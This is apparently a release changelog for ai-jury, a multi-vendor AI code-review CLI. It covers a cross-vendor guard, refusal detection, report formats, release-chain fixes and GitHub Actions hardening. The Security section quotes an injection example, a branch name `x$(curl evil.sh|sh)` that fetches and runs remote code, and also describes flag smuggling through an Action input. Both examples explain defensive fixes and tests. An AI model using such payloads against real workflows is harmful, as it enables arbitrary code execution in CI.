  - **Exit 0 with something on stdout is no longer automatically a review.** `adapters.no_review_reason` classifies a refusal, a usage/argument-error banner, or a bare version string as `ok=False` with a new typed `error_code = "no_review"`, in `Adapter.run`, `GenericCLIAdapter.run`, `LocalAdapter.run` and the hosted-API adapters alike. Fail-soft still applies — the run continues — but the seat is now *recorded* as dead instead of counted as a vendor. It judges shape, never quality, and every branch is bounded, because the guard fails CLOSED — a discarded review is a dead seat, and a dead seat can drop the panel under `min_vendors` and exit 3 on a run that was fine. So a banner is only a banner when the output *is* one: the usage and argument-error patterns are matched against a whole line at the head of the output, and either the output is short (the same bound the refusal branch uses — a real review is not three lines) or it carries corroborating banner structure, a synopsis line plus an options block. The ambiguous forms need both: "unknown flag: --print" must name a flag-shaped token *and* sit next to that structure, and "for more information, try '--help'" corroborates but never triggers. A review opening "Usage of int() is unsafe...", one saying "Invalid argument passed to calculate_total() on line 42", one pointing at "for more information, see the docs", and a long one that happens to say "I cannot verify the migration" are all untouched. `no_review` is deliberately not retryable — a misinvoked CLI prints the same banner every time — and `empty_output` keeps its own code, since consumers key off it.
  - **A refusal only counts when the refusal IS the output.** Matching a decline phrase anywhere inside the length bound destroyed genuine short reviews: "Sorry, I missed the null check on line 12 in my first pass", "I'm not able to reproduce the race locally, but the lock ordering here is wrong", "I do not have access to the schema file, so I reviewed only the Python changes" — all discarded, and with the gate now failing closed, one of those turns a passing two-vendor run into exit 3. Three conditions are now required together: the output is short, the decline OPENS it, and nothing in it carries review substance (a line reference, a claim of having reviewed, or an adversative pivot into a statement about the code that is not itself another decline). And a structured findings block short-circuits the whole predicate before any prose heuristic votes — an agent that emitted the reviewer's contract has reviewed, whatever it said first. A true refusal ("I cannot review this content.") still dies.
  - `tests/live/test_live_contracts.py` is the live half, still behind `JURY_LIVE=1`: it proves the *locked* invocation is one the installed CLI still accepts, which only a real binary can answer. The two halves fail in opposite directions — edit an adapter and the offline lock goes red for free; ship a CLI that renamed a flag and only the live probe can see it — and `docs/release-checklist.md` now requires the live run before any release that touched `adapters.py`.
- **`--no-min-vendors`, and a `panel` block in `jury --doctor --json`** (#682): the explicit opt-out for the guard below, and the readiness view an orchestrator needs before it spends anything. The export carries `vendors_configured`, `vendors_available`, `min_vendors`, `multi_vendor_ready` — and `contributing_vendors`, which is **always `null`**. That is the point of including it: doctor runs no review, so it can report reachability and nothing more, and a consumer must be able to see that the question was left unanswered rather than assume a green doctor means a cross-vendor panel. The run's real count stays where it was, in `--metadata-json` under `panel.vendors`. The human report grows a matching **Cross-vendor readiness** block, and when two or more vendors are enabled and too few are reachable, a warning says so up front rather than letting the run discover it. The keys land inside `ai-jury.doctor.v1` rather than bumping the schema: v1 has not been released, so no consumer can be pinned to a shape without them.

### Changed
- **`--min-vendors` now fails closed** (#682): the guard against a panel that collapsed to one vendor shipped opt-in (`0`) while the policy question was open, which meant every default install — and every consumer of the composite Action, whose `args` defaulted to `--auto --post` — inherited a fail-soft single-vendor run. The default is now `2`, from a new `[jury.ci] min_vendors` key. A degraded run that says so is recoverable; a false consensus is not, and the two are byte-shaped alike.
  - Turning it on by default is only safe because it is **scoped**: the default gate applies to runs that claimed cross-vendor consensus in the first place — two or more *distinct vendors* enabled — so a deliberate single-agent install keeps exiting 0 and nobody has to opt out of a promise they never made. A threshold typed on the command line is enforced as typed: `--min-vendors 2` on a one-vendor config fails, because that is what was asked for.
  - `--no-min-vendors` (or `min_vendors = 0`) is the explicit opt-out; a malformed config value falls back to the default rather than silently disabling the guard, since the default is the safe direction. Exit **3** is unchanged and still distinct from the `--ci` findings failure, so a caller can tell "the reviewers disagreed with you" from "the reviewers never ran".
  - `action.yml` gains a `min-vendors` input defaulting to `"2"`, appended as `--min-vendors N` unless `args` already names `--min-vendors` or `--no-min-vendors` — in either the `--flag value` or the `--flag=value` spelling, and at any position — so an explicit choice always wins. Matching only the space-separated form meant `args: "--min-vendors=0"` got a second, contradicting `--min-vendors 2` appended behind the caller's back. The value is validated as digits before it is word-split into the command line — it is caller-supplied, and `min-vendors: "--post"` would otherwise smuggle a flag into the invocation, one layer below the hole #584 closed for `version`.
  - **What "scoped" means, said plainly:** the gate scopes on the vendors a configuration NAMES, not on what a machine happens to have installed. So the shipped three-vendor `jury.toml` on a host with one installed CLI now exits 3 — deliberately. A configuration that promises three vendors and delivers one is exactly the collapse this exists to catch, and a missing CLI is not an exemption; the docs previously implied "a single installed CLI" was one, and they were wrong. Both escapes are named in the failure message itself: `--no-min-vendors` / `[jury.ci] min_vendors = 0` to accept a collapsed panel, and `--strict` to have the missing CLI reported at startup instead of as a collapsed panel afterwards. Someone meeting this in CI should not have to read the source to get past it.
  - `min_vendors` joins the other `[jury.ci]` values in `config_hash`, which is consistent (a gate value that changes a run's outcome belongs in the identity of the run) and costs one **one-time cache invalidation** on upgrade: every existing review cache entry misses once, and the next run repopulates it. No action required, and no correctness consequence — just one slower run per repository.
  - The composite Action treats an **empty** `min-vendors` as "use the default 2" rather than an error. An unset repository or organization variable arrives as the empty string, so `min-vendors: ${{ vars.MIN_VENDORS }}` hard-failed the step with exit 2 for a caller who had asked for nothing unusual. A genuinely non-numeric value still exits 2, and still before the value is word-split into the command line.
  - `jury --doctor`'s `panel.multi_vendor_ready` is now the same judgement the warning makes, from one predicate that mirrors `metadata.collapse_reason`'s scoping. It previously read `vendors_available >= min_vendors`, so a single-agent config with its CLI missing reported "cross-vendor ready: no" for a run the gate never fails — a diagnostic that disagrees with the runtime teaches people to ignore it.
  - Documented in `docs/parameters.md` (the flag pair plus a section on what it catches that `--strict` cannot), `docs/configuration.md` (`[jury.ci]`, and the `panel` block of the doctor export), `docs/cookbook.md` §7 (proving the panel did not collapse) and §15 (the Action's default), `docs/architecture.md` ("fail-soft is not a multi-vendor guarantee"), `README.md`, `SECURITY.md` (for anyone gating a merge on the verdict), the shipped `jury.toml`, and the `jury init` template.

### Security
- **The same rule now covers `github-script` bodies and `action.yml`** (#685): #684 pinned "no `${{ }}` in a `run:`" over every job in every workflow. Two places carrying the identical injection sat outside that walk. An `actions/github-script` `script:` body is **JavaScript source**, and the expression is substituted into it before Node parses it, so `core.info("${{ github.event.pull_request.head.ref }}")` on a fork branch whose name carries a `"` and a `)` is arbitrary Node in the job — the `run:` shape of #680 in a different language. And this repository's own composite `action.yml` lives outside `.github/workflows/` entirely, so its two `run:` blocks were never opened by any scan; #584 had to move four of that file's inputs out of the shell by hand and left the fifth behind, which was fixed separately later, and nothing kept either from coming back.
  - `tests/test_workflow_run_blocks.py` now also walks every **step** of every workflow, and every action manifest — the repository root's `action.yml`/`action.yaml` plus anything under `.github/actions/**` — failing on `${{` in a `script:` body under a `uses: actions/github-script@…` step, or in any `run:` or `script:` value of a manifest, and naming the file, the step and the line. A `script:` input on any *other* action is an ordinary input name, not source, and is left alone.
  - The three scans share one collector, so a block scalar (`|`, `>`, and their chomping variants), an inline value and a plain scalar continued over several lines are read identically in all of them; the step walk is anchored on `steps:` keys rather than on a fixed indent, because a workflow job and a composite action spell the same list at different depths.
  - **A count of zero is declared, never passed.** This tree has no `actions/github-script` step at all, and "no files, no findings, green" is exactly what a broken walk reports (#677), so that count test **skips with a reason** — naming the mutation test that carries the rule instead — rather than passing silently. The manifest counts are anchored on `action.yml` and its `Install ai-jury` step, and one mutation per key type requires the failure: a github-script step added to a copy of `ci.yml` (which the `run:` scan is asserted to miss, the reason the widening was needed), and a `run:` and a `script:` in a copy of `action.yml`. A fourth writes a manifest under `.github/actions/`, a location this tree does not yet use, so the glob cannot quietly stop covering it.
- **Every `run:` block in every workflow is now checked for an Actions expression** (#683): #680 fixed the `bot-push-guard` job — `${{ github.event.pull_request.head.ref }}` was pasted into its shell, where GitHub substitutes it into the *script source* before bash parses it, so a fork branch called `x$(curl evil.sh|sh)` would have executed in the job — and pinned the rule for that one job. A reviewer read the other six workflows by hand and found them clean; nothing kept them that way.
  - `tests/test_workflow_run_blocks.py` walks every file under `.github/workflows/`, every job in each file, and every `run:` value — block scalar (`|`, `>`, and their chomping variants), inline, and a plain scalar continued over several lines — and fails if any of them contains `${{`, naming the file, the job and the line. Line-anchored and stdlib-only, like `tests/test_keel_evidence_workflow.py`: the package ships with no runtime dependencies, so there is no YAML parser to lean on.
  - **A hand-rolled walk that matches nothing reports a clean repository forever** (#677), so the scanner is tested before it is trusted: against workflow text whose answer is known (including a `run:` inside a heredoc, and `runs-on:`, which must not be mistaken for one), against the real tree for non-zero file, job and `run:` block counts, and by mutating a copy of `ci.yml` — in a block scalar and in an inline `run:` — to require the failure the invariant exists to produce. An expression in `env:`, which is the fix #680 applied, stays legal.
- **Four I/O Error Messages Still Interpolated The Raw Exception** (#658): `jury --diff-file`, `jury apply --report`, and the read/write arms of `apply_patch_suggestion` formatted `{exc}` straight into their error text while every neighbouring arm in the same files already went through `redact(str(exc))[0]`.
  - An `OSError` carries the *absolute* path git or the OS resolved, which is not the relative path the outer message names — so a token-shaped directory component reached stderr or the apply report even though the message around it was already careful.
  - Defence-in-depth rather than a demonstrated live leak; the exception text is now wrapped like its neighbours, and a regression test per arm plants a GitHub-token-shaped path component and asserts only `[REDACTED:github_token]` comes back.
- **The Report Said What The Panel Found, Never Who Said It** (#663): the JSON report carried consolidated `findings` with a `reviewer` field and one chair verdict. Which *panelist* took which stance, on which vendor and which model, existed only as prose in the markdown vote block — so a consumer that wants the panel to **be** its review, one head-pinned verdict per reviewer, had nothing to render.
  - `jury --format json` gains a top-level `reviewers` array: per panelist, its own round-1 verdict, vendor, effective model, the indexes of the findings it raised, whether the adapter reported success, how many of its findings the verifier upheld, and its wall-clock seconds. The chair rides at the end as the entry carrying `role: "chair"`.
  - `jury --format keel-reviews` renders the same panel as the array keel's `keel review --reviews` accepts — `{reviewer, verdict, scope, findings, testing, vendor, model}`, with `file` → `path` and `claim` → `message`. Because every record carries its own `vendor`, a cross-vendor panel satisfies a distinct-vendor evidence requirement on its own rather than through a separate count.
  - **Purely additive.** No existing key was removed, renamed or reshaped; `schema_version` moved `1.0` → `1.1` to signal the addition, and markdown and SARIF are untouched. A backward-compatibility test reconstructs the whole 1.0 document from the outcome and asserts it equals the new one minus `reviewers` — field for field, not key-presence.
  - A ballot's verdict *calls* `voting.tally_votes` rather than reimplementing the severity thresholds, so the JSON verdict and the markdown tally cannot drift apart; the chair's verdict reuses the report's own headline lift for the same reason.
  - A slot that returned output but did not review — an empty reply, a refusal, a failed adapter — is `ABSTAIN`, not `APPROVE`. That is #251's property restated for ballots: the tally drops such a reviewer, and a list that must name every slot names the abstention instead of inventing a stance for it.
  - `scope` and `testing` are the only fields lifted from agent prose, which is attacker-influenced: both are flattened, capped per clause and per count, skip the review's fenced JSON block, and match on word boundaries. The last one is load-bearing — this tool's own house phrasing is "**un**checked return value", and a substring test folds that finding into the coverage summary as a check the reviewer never made.

### Removed
- **`Formula/ai-jury.rb`** (#645, #666): a committed formula names an sdist url and a sha256, and neither is knowable until the tag is pushed — PyPI's paths are content-addressed and the digest belongs to an artifact that does not exist yet. Every release therefore had to write to `main` a *second* time to make the file true.
  - That write was attempted four ways in three days and failed every time: a direct push branch protection refused and `|| true` swallowed (#633), a loud `::error::` nobody acted on (#638), a pull request whose refspec could not be created from a detached HEAD (#641), and auto-merge on that pull request, which needed a repository setting that is off (#643). Seven consecutive releases needed a fix-forward commit.
  - What is committed now is `packaging/homebrew/ai-jury.rb.template`, which names `@URL@`, `@SHA256@` and `@VERSION@` and cannot go stale. `publish.yml` renders it after the upload from what PyPI reports, re-downloads the artifact to confirm the digest is that artifact's, and publishes the result to the GitHub Release and to the tap. **A release is now exactly one write to `main`: the release pull request.**
  - `pull-requests: write` is gone from the workflow with the pull request it existed for, and the *Allow GitHub Actions to create and approve pull requests* repository setting is no longer part of the release chain.
  - The tap's `sync-formula.yml` pulled the deleted file every thirty minutes, so the change it needs ships here rather than as a request that someone remember it: `packaging/homebrew/tap-sync-formula.patch` repoints it at `https://github.com/berkayturanci/ai-jury/releases/latest/download/ai-jury.rb`, verified to apply cleanly against the tap's current file.
  - The patch also makes the tap's fetch tolerate an asset that is not published yet. The ordering is repoint → merge → next release, and it is the merge that makes the next release attach `ai-jury.rb`, so for one cycle the url 404s. The patched fetch records `found=false`, prints a `::notice::`, and skips the verify and commit steps — the tap keeps serving what it has and its cron stays green. Failing there would have traded one red cron for another.
  - The deletion is gated on the repointing being recorded: `tests/test_homebrew_formula.py` fails while `Formula/ai-jury.rb` is absent and `packaging/homebrew/TAP_REPOINTED` does not name the tap commit that applied the patch, as `tap-sync-formula: <40-hex>`. That is a claim in a reviewable form, not proof — nothing offline can read another repository — but a sha is falsifiable where `echo x >` is not. The check that *is* proof reads the tap's live workflow under `AI_JURY_CHECK_EXTERNAL=1`; it runs in `Action pins match upstream`, which is not a required status check on `main`, so it is advisory until someone makes it one. Gate and marker are single-use.
  - The render step now waits five minutes for PyPI's index, the same budget `verify` uses. At sixty seconds a slow index failed the job after the upload and before the GitHub Release — the half-made release this change exists to remove.
  - The tap has been repointed — `berkayturanci/homebrew-ai-jury@7907ecf` (homebrew-ai-jury#3) — and `packaging/homebrew/TAP_REPOINTED` records it, so the gate is green because the work was done rather than because the marker was written. Both are single-use and can be deleted after a release or two.
  - The formula also stops being a *release surface*. #665's `RELEASE_SURFACES` listed `Formula/ai-jury.rb` twice, for its version markers; with the file gone there is nothing to list, and `packaging/homebrew/ai-jury.rb.template` names the literal `@VERSION@`, which cannot go stale. The third entry point over that table is now `scripts/verify_merge.py --check-surfaces` (`make release-check`) — a different command with a different failure mode, since it does not require git tags, though it shares `mismatches()` with the metadata test — rather than the formula test, which no longer reads the table at all.
  - The tap push is now guarded on `HOMEBREW_TAP_TOKEN` being present, via a step output because `if:` cannot read `secrets.*`. Unguarded it handed `gh` an empty token and `gh api -X PUT` returned 401 under `set -euo pipefail`, failing the release job *after* PyPI and the GitHub Release had succeeded — reporting a good release as broken. The secret is not configured, so that was the default path. Its absence is now a `::warning::` and a step summary naming both ways to fix it.

### Fixed
- **`jury init` Never Shipped The Cross-Vendor Hint The Code Was Written To Emit** (#692): `scaffold.py` has defined a commented `min_vendors` block since #682, but `render_toml` wrote `[jury.ci]` only when the caller passed `ci_fail_on` — which none of the four presets and no plain `jury init` ever does. So every generated `jury.toml` was silent about the guard that exits 3, `--preset thorough` included: it names three or four vendors, and is therefore exactly the config that collapses on a machine with one CLI installed. The section is now written unconditionally, with the hint under it; `fail_on` still appears only when a caller chose one, so an untouched file states no redundant defaults and parses to the same `{}` the run already resolved. Pinned by a test that drives the real CLI over every entry in `PRESETS` and asserts the section, the hint, the exit code and the opt-out are all in the generated file, and that it still loads with `min_vendors == 2`.

- **Two Readings Of One State File Could Disagree, And The Guard Watching Them Could Pass Vacuously** (#677): follow-ups from the round-5 review of #674 — hardening only, none of it reachable in normal use.
  - `pid_alive` and `liveness_unknown_reason` classified the same state document differently. `bool` subclasses `int`, so `pid_alive(True)` fell through the `isinstance(pid, int)` guard, probed pid 1, and reported "alive" on POSIX (`PermissionError`), while `liveness_unknown_reason` — which already excluded `bool` — called that same state "has not recorded a process id yet". Only reachable through a hand-edited or corrupt state file, and safe in today's direction (a run stays `running`, never falsely `lost`), but two answers about one document that can drift apart is exactly the shape that later becomes a bug. `pid_alive` now excludes `bool` too, pinned next to the `liveness_unknown_reason` case so neither can move alone.
  - **The static wait guard now proves it looked at something.** `test_every_wait_call_in_this_module_can_terminate` asserted its offender list was empty but never that it had inspected a single call, so a rename of `_run_run_agent_capture` or a move of the wait tests to a sibling module would have left it matching nothing and passing in silence — a guard whose failure mode is quiet. It now asserts it still sees at least the 12 direct waits and 8 CLI waits it matched when written, *before* asserting the list is empty.
  - **`_run(["--wait", ...])` is inside the guard.** The walk watched `wait_for_run` and `_run_run_agent_capture`, which have injectable `sleep`/`clock` seams, but not `_run`, which has none and reaches the real `time.sleep` through the CLI. All eight existing sites are safe (terminal states, refused ids, no state file, or `wait_for_run` patched out), but a future `_run(["--wait", …])` against a state written as `running` would have blocked on the real clock for the hour the default deadline allows, with the guard silent. The rule a static walk can see is now enforced: a test that writes a `running` state and waits through `_run` without patching `wait_for_run` is an offender.
  - Both rules moved out of the test body into module-level helpers, so the companion self-tests exercise the guard itself rather than a second copy of its reasoning that could drift from it — which is the failure this whole entry is about, one level up.
- **A verdict comment no longer cancels the assessment run** (#679): `.github/workflows/keel-ship.yml` ran `pull_request` and `issue_comment` under one `concurrency` group keyed on the PR number, with `cancel-in-progress`. `keel review --live` posts its verdict comments seconds after the push that started the assessment, so the comment run cancelled the still-running `pull_request` run — and a cancelled run's `keel ship (assessment)` / `keel evidence (verify)` check-runs stay `cancelled` on that head and cannot be deleted. GitHub reports the head as UNSTABLE and `keel merge` refuses on "CI failing" with every required check green; every ai-jury PR merged on 2026-09-03 (#668, #670, #671, #672, #674) needed a hand-run `gh run rerun`. Ported from berkayturanci/keel#1038, hunk for hunk, so the next sync of this consumer copy stays a clean diff.
  - The group now carries the event name — `keel-ship-pull_request-<n>`, `keel-ship-issue_comment-<n>`, `keel-ship-workflow_dispatch-<n>` (a dispatch with no `pr` input falls back to the ref: `keel-ship-workflow_dispatch-refs/heads/main`) — so no trigger can cancel another's run. Cancelling *within* one event stays on, though not because the cancelled run is always on a superseded head: `reopened`, a `synchronize` fired by a **base**-branch update and a force-push back to an already-assessed SHA all re-run `pull_request` on an unchanged head. What covers those is that the canceller is a run of the same event on that same head, so it republishes both job check-runs under the same names, and branch protection and keel's own rollup dedupe alike read the most recent check-run per name. A different event cancelling republishes nothing, which is exactly why that case broke.
  - The cost, paid knowingly: `keel review --live` posts three verdicts seconds apart, so two of those `issue_comment` runs are now cancelled inside their own group, and that event always runs from the default branch — so those cancelled `keel evidence (verify)` checks land on the default branch's tip. Visible in the UI, read by nothing that gates a PR.
  - **Splitting the groups reintroduces the race the shared group prevented**, so the guard moved into `publish_check`: each run stamps the moment it read the PR — taken immediately *before* `keel evidence-verify`, never after, since a run that started before a verdict was posted can still finish after the run that saw it, and in nanoseconds, since two racing runs are seconds apart and whole seconds leave the common case unordered — into the check-run's `external_id`, and declines to overwrite a check-run stamped later, logging a `Newer evidence verdict kept` notice instead. The stamp is read off the newest run under the gating name (`max_by`), not off whichever row the list endpoint returns first. This is a read-then-write guard, not a compare-and-swap — the check-runs API offers none — so it shrinks the window from the whole install-and-verify run to a single API round trip rather than closing it. The authoritative verdict is the one from the run that read the PR last. A check-run carrying no stamp is still overwritten: freezing the gate on whatever it last said is the wrong direction for a run that has read newer state.
  - **A declining run exits 0 and does not replay its own verdict.** `publish_check` returns 3 rather than 0 when it declines, because "a newer run holds the check" and "this run published" are different outcomes. Conflating them meant an older `pull_request` run that correctly declined to overwrite a newer success still exited 1 on its own stale violation code, marking `keel evidence (verify)` FAILURE on the live head — and keel's rollup scores FAILURE exactly like CANCELLED, so `keel merge` would have refused on "CI failing" all over again. The two reads can genuinely disagree: this workflow subscribes to comment `edited` as well as `created`.
  - `tests/test_keel_evidence_workflow.py` renders the group expression for a `pull_request`, an `issue_comment` and a `workflow_dispatch` context and fails if any two collide — with no YAML parser and no runtime dependency, the way the rest of that module reads the workflow. Asserting that the expression *mentions* `github.event_name` would pass for a group that still renders one string per PR, which is the bug. The declined path's exit code, the stamp's resolution and the `max_by` lookup are each pinned separately.
- **A Ninth Version Surface Had To Be Registered In Three Places** (#665): version lockstep was guarded by three disjoint lists — `VERSION_MARKERS` in `scripts/verify_merge.py`, `SITE_SURFACES` in `tests/test_release_metadata.py`, and two hard-coded assertions in `tests/test_homebrew_formula.py` — plus a fourth in `docs/release-checklist.md` that asked a person to bump eight files by name.
  - Registering a surface therefore meant three edits that nothing forced to happen together, and the one that was missed is the one that went stale: `website/index.html` and `website/app.js` sat at v1.14.4 through two releases (#646).
  - There is now one table, `scripts/release_surfaces.py`, holding every file that names the version together with the pattern that reads it. All three guards import it and none keeps a copy; `tests/test_release_surfaces.py` monkeypatches the table and runs the guards themselves, so removing an entry has to make all three ignore that file and adding one has to make all three check it.
  - `make release-check` (`scripts/verify_merge.py --check-surfaces`) asks the release question locally in one command: does every listed surface name what `pyproject.toml` declares. It deliberately does not require git tags, so it works in a shallow clone.
  - The checklist no longer lists filenames. A list in prose is a list that drifts, which is how this started.
- **Nothing Installed What A Release Published** (#666): the publish job re-hashed a tarball it had just downloaded, and `ci.yml`'s external check runs on pushes to `main`, not on the tag. So a release could be green from end to end while `pip install ai-jury==<tag>` produced something that would not start — which is the only question a release actually has to answer.
  - A `verify` job now asks it the way a user does: wait (bounded) for PyPI to serve the version, create a clean virtualenv, `pip install ai-jury==<version>` from the index, require `jury --version` to equal the tag, and run `jury --doctor`. It then checks that the digest the Homebrew tap tells `brew` to expect is the digest of the sdist PyPI serves.
  - On failure it opens — or comments on, deduped by title — a `release-broken: <tag>` issue. A red workflow nobody is watching is how the last seven releases went out needing a fix.
  - The formula check is against the **release asset**, unconditionally: this run wrote it, so there is nothing to wait for. The *tap* is checked only when the push step itself reported success — not merely when a token was present, since a token is a precondition for trying rather than evidence of a result — otherwise the tap catches up on a thirty-minute cron while the job polls for 150 seconds, which would fail every release over latency that is by design. That is the same mistake the online formula check already made once, and it is not repeated.
  - No `brew` on the runner: installing Homebrew on Linux to read one field is slower and more fragile than reading the field.
- **The Website Told Visitors The Wrong Release, For Two Releases** (#646): `website/index.html` and `website/app.js` sat at v1.14.4 through 1.15.0 and 1.15.1 while the package, both plugin manifests, the README and the cookbook were all current.
  - It looked automatic. The element carries `id="site-version"` and links to `/releases/latest`, so a reader would reasonably assume it resolves the version rather than hard-coding it.
  - The release checklist asks for those two files by name. A checklist line is a request that someone remember, and for two releases nobody did — the same failure mode as the formula digest note, on a different surface.
  - Pinned by `NoUserFacingSurfaceCarriesAStaleVersion`, which checks every surface that names a version against `pyproject.toml`. Anchored on surrounding context rather than scanning for version-shaped strings: `app.js` contains numbers like `1.19.214` in its demo data, and a blanket scan would have to be weakened until it caught nothing.
- **The Last Step In The Formula Chain Was Still A Person** (#643): #638 made the release open a pull request with the digest instead of erroring about it. Opening it is not the goal — the tap only recovers when it *merges*, and until then it retries and fails roughly every half hour while the release itself is long since green.
  - The pull request is now armed to land on its own once CI has re-verified the digest against the published sdist. `main` requires status checks and no approvals, so nothing is bypassed: the wait removed is the one between "green" and "someone noticed".
  - Best-effort. With auto-merge disabled the step prints a notice and the pull request waits for a person, exactly as before.
  - Asserted separately from `gh pr create`, since the two are one line apart and deleting the second leaves a change that still reads as complete.
- **The Automatic Formula PR Could Not Push, On Its First Live Run** (#641): `git push -f origin "HEAD:${branch}"` is refused from the detached HEAD a tag build checks out. Git will not guess the remote namespace when a refspec's source is a bare commit rather than a branch — *"The destination refspec neither matches an existing ref … nor begins with refs/"* — so the branch was never created and no pull request was opened.
  - It failed in the good direction: 1.15.1 reached PyPI and the GitHub Release, the `::error::` path fired with the correct digest, and the step summary carried it. The release was not reported as broken. The tap was stale anyway, which is the outcome #638 exists to prevent.
  - Fully qualified as `HEAD:refs/heads/${branch}`, and pinned by a test asserting that any push whose source is `HEAD` names the full destination ref. The sibling repository avoids the same trap the other way, by creating a real local branch first; either is correct, pushing `HEAD:` to a bare name is not.
  - The formula digest for 1.15.1 is set here by hand, since the run that should have proposed it could not. Verified end to end against the published sdist: `AI_JURY_CHECK_EXTERNAL=1` now downloads the artifact and re-hashes it, rather than skipping.
- **`--ci` could launder a collapsed panel into a clean pass** (#682): the collapse check ran first and set `ci_exit = 3`, and then the `--ci` branch *reassigned* `ci_exit` from `evaluate_ci`, erasing it. So `jury --ci --min-vendors 2` on a single-vendor run exited 0 with a verdict — the exact failure the flag was added for, in the one configuration most likely to be gating a merge. The collapse now outranks the severity gate: `evaluate_ci` reports on findings the panel did or did not raise, and a panel that never formed is not evidence either way.

### Documentation
- **The Three Surfaces A User Meets First Did Not Carry This Release** (#692): the deep reference set (`docs/parameters.md`, `docs/configuration.md`, `docs/cookbook.md`, `docs/report-format.md`, `action.yml`, this repository's own `jury.toml`) described 1.16.0 accurately. The website, the README's declared exit-code contract and `llms-full.txt` did not — and those are what a first-time user reads, what a CI integrator trusts, and what an agent is pointed at.
  - **The website said nothing about the release.** `run-agent`, `min_vendors`, `exit 3` and `doctor --json` had zero occurrences anywhere under `website/`, so someone installing from the hero and running on a one-CLI machine met exit 3 with nothing on the site to look it up in. The configuration section now carries the guard — default 2, exit 3, what scopes it, and both opt-outs — and the commands block carries `jury run-agent`, `--no-min-vendors` and `jury --doctor --json`.
  - **The site's `[jury.ci]` card described a key the section does not have.** It said the section takes a `format` key; `_ci_from_dict` reads exactly `fail_on`, `ignore_unverified` and `min_vendors`, and `format` is a CLI flag. Rewritten as the three real keys, with `min_vendors` — the one that changed — given a card of its own.
  - **The README's exit-code table omitted exit 3.** That table is the project's own stable contract, and the README requires a changelog entry to change it, so a CI integrator reading it concluded 0/1/2 were the whole set. It now lists exit 3 as the cross-vendor guard, distinct from the `--ci` findings failure (which is stated as `1` rather than "non-zero"), including that it is checked with or without `--ci`, that the default is scoped to runs that claimed consensus, and that an explicit `--min-vendors` is enforced as asked. `tests/test_min_vendors.py` pins the row, anchored on the table rather than the file.
  - **`llms-full.txt` was stale as the "full reference" the README points agents at.** It listed neither `--min-vendors`, `--effort`, `--decision`, `--transcript`, `--tiered`, `--hints`, `--json` nor `--issue`/`--commit`/`--commits`, named four of the nine subcommands, and its `[jury.ci]` block showed two keys. The subcommand, CLI-flag and `[jury.ci]` sections are regenerated from the current parser and config schema, with an exit-code summary and the real nine-vendor list. `tests/test_cli_contract.py` guards the README's flag list only, which is how this drifted.
  - Also: `docs/configuration.md`'s `--doctor --json` example showed `"tool_version": "1.15.1"`; `llms.txt` gained a `jury run-agent` bullet, `min_vendors` in the `[jury.ci]` keys, and a `--fail-on` example using severities that exist (it said `high,critical`, and `high` is not one — the gate would never have fired); `skill/ai-jury/SKILL.md` says exit 3 means the panel collapsed rather than that findings blocked the merge, which an agent driving the CLI would otherwise report as a failed review; and `docs/architecture.md` points at the per-reviewer ballots in the report-format contract.
  - Every command, flag and config key added here was executed against this tree before the pull request was opened, including producing exit 3.
- **Four Docs Claims That Had Stopped Being True** (#686): a read-through of README, `docs/`, `CONTRIBUTING.md` and the website against `main` found four statements the code had moved out from under, each one the kind a reader has no way to doubt.
  - **The coverage gate was documented as 99%; it is 98.** `README.md` had stated the higher number since the floor was lowered, so a contributor planning around it was planning around a gate that does not exist. Both now state the enforced floor and, separately, that the floor is deliberately below the measured total — pointing at `pyproject.toml`'s own comment, the live badge and `make coverage` for the measurement rather than restating a figure that goes stale.
    - *Both*, because `website/coverage.html` — the page the README sends people to — said 99% in five more places, and one of them was not prose: `if (pct >= 99)` decides the label under the published figure, so a run that **passes** CI at 98.5% was rendered on the public site as "Below the 99% gate", in warning colours. The threshold, the heading paragraph and the three meta descriptions are all 98 now.
    - `tests/test_docs_coverage_gate.py` asserts every one of those figures — across `README.md` and `website/coverage.html`, the JavaScript threshold included — is the value `[tool.coverage.report] fail_under` sets, so raising the floor fails the suite until each statement is raised with it. It is anchored on the phrases around each number, so the gauge's colour ramp (`pct >= 90`, `>= 80`, `>= 60`) is never mistaken for the gate.
  - **`docs/parameters.md` listed three output formats and shipped four.** Its "Output formats" summary said `markdown · json · sarif`, contradicting the same file's own "Output & format" table and `cli.py`'s `choices=["markdown", "json", "sarif", "keel-reviews"]` two hundred lines earlier. `keel-reviews` is listed, with the one line it needed: it is a bundle rather than a report — one record per panelist plus the chair, for an orchestrator that renders a verdict per reviewer.
  - **Cookbook §21 claimed an integration that does not exist.** "This is the integration point for keel's `keel delegate run`" described a call keel does not make: keel's `src/keel/delegate.py` is an *independent port* of the same contract, naming ai-jury's `adapters.py` as a read-only reference, and the string `jury run-agent` appears nowhere in keel's tree. Rewritten as what it is — two implementations of one contract, `jury run-agent` being the entry point for any orchestrator that wants one — with [keel#1015](https://github.com/berkayturanci/keel/issues/1015) named as the change that will make keel actually call the jury, and a note to revisit the section when it merges.
  - **Cookbook §16 credited the wrong half of keel.** The `.keel/state/jury/<run-id>.json` save is written by keel's **ship adapter** (`src/keel/adapters/commands/ship.md`, s8), not by anything in `src/keel/*.py`; `keel-visual` only reads the file. Attributed to the adapter, with the flags it actually passes and the fail-soft, never-gating behaviour that goes with them.
  - **`docs/release-checklist.md` still asked whether to release publicly.** Twenty-one "Required before public" boxes sat unticked through fifteen public releases, so nothing distinguished an outstanding item from a satisfied one and the section read as noise. Every box is ticked with the evidence beside it — the workflow job, test or file that holds it — and the two that were subtly wrong are corrected: the CI matrix is 3.11–3.13 on Linux plus 3.13 on macOS and Windows, not every version on every OS, and the CodeQL alert check now says to filter the code-scanning inbox by `tool.name`, because the open alerts there are mostly stale Scorecard findings left behind when #201 stopped uploading that SARIF — they carry `high` severities and are not CodeQL results. The first box also cited `tests/test_release_metadata.py` as pinning the packaging metadata when every test in that module was about version lockstep; `PackagingMetadataIsComplete` now pins what the box claims — the identifying fields, the PyPI sidebar URLs, a `jury` entry point that resolves to a `main()` that exists, and Python classifiers that agree with `requires-python`.
- **The Homebrew release chain, rewritten around the removal** (#666): `docs/homebrew-release-chain.md` no longer explains how four mechanisms repair a file that cannot be right; it explains why the file is gone. The "Still manual, and why" section went with the pull request it described — neither repository setting is on the release path any more.
  - `docs/releasing.md` gains the formula as a release artifact and the `verify` job, and loses the stale claim that trusted publishing is evidenced by v1.0.0 and v1.1.0.
  - `docs/release-checklist.md` no longer asks anyone to bump a formula, and step 8 now starts by reading the `verify` job's log rather than by re-running its checks by hand.
  - `packaging/homebrew/README.md` says the same thing where someone looking for the formula would land.
